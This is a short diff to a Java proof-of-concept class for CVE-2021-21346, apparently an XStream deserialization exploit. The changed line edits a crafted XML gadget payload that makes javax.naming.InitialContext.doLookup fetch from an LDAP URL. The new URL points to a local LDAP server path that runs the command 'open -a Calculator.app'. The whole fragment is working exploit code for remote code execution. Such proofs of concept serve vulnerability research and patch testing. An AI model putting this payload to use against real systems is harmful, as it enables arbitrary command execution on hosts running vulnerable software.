@@ -43,7 +43,7 @@ public class CVE_2021_21346 {
                 "                  <className>javax.naming.InitialContext</className>\n" +
                 "                  <methodName>doLookup</methodName>\n" +
                 "                  <args>\n" +
-                "                    <string>ldap://127.0.0.1:23457/Command8</string>\n" +
+                "                    <string>ldap://127.0.0.1:1389/Basic/Command/open -a Calculator.app</string>\n" +
                 "                  </args>\n" +
                 "                </sun.swing.SwingLazyValue>\n" +
                 "              </hashtable>\n" +
